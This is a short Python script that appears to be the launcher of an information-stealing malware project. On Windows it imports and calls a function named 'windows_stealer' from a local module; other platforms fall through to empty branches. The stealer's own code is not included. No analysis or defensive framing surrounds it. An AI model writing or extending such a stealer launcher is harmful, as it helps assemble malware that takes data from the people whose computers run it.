import sys

if sys.platform == 'win32':
    from windows import windows_stealer
    windows_stealer()
elif sys.platform == 'linux':
    pass
else:
    pass
